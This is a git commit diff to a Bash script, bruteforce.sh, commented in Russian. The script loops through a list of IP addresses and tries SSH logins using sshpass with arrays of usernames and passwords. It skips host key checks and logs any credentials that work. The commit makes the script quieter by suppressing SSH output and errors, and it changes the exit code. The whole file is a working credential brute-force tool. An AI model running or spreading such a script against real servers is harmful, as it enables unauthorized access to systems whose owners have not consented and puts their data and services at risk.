161cfc837e3b3bb34024b2123a84f6f4fa49b4a5
Dmitry <45873005+bokhanych@users.noreply.github.com>
2023-08-30 13:28:55 +0300

    Update bruteforce.sh

--- bruteforce.sh
+++ bruteforce.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 # Скрипт читает список IP адресов из файла $IP_LIST_FILE, затем пробует подключиться к ним под учетками из массива USERS_ARRAY, используя пароли из массива PASSWORDS_ARRAY. 
-# В случае успешного подключения, выводит IP адрес сервера и валидные креды от него.
+# В случае успешного подключения, выводит IP адрес сервера и валидные креды от него в $LOG_FILE.
 
 USERS_ARRAY=("USER1" "USER2")
 PASSWORDS_ARRAY=("PASSWORD1" "PASSWORD2" "PASSWORD3")
-IP_ARRAY=() # Массив для IP-адресов
+IP_ARRAY=()  # Массив для IP-адресов
 IP_LIST_FILE="ip_list.txt"
 LOG_FILE="ip_accessed_list_log.txt"
 
@@ -23,7 +23,7 @@ IP_STRING="${IP_ARRAY[@]}"
 for IP in "${IP_ARRAY[@]}"; do
     for USER in "${USERS_ARRAY[@]}"; do
         for PASS in "${PASSWORDS_ARRAY[@]}"; do
-            result=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER"@"$IP" echo 'CONNECTED')
+            result=$(sshpass -p "$PASS" ssh -q -o StrictHostKeyChecking=no "$USER"@"$IP" echo 'CONNECTED' 2>/dev/null)
             if echo "$result" | grep -q "CONNECTED"; then
                 echo "ПОДКЛЮЧЕНО! Host: $IP, username: $USER, password: $PASS" | tee -a $LOG_FILE
             # Для тестирования:    
@@ -33,4 +33,4 @@ for IP in "${IP_ARRAY[@]}"; do
         done
     done
 done
-exit 1
+exit 0
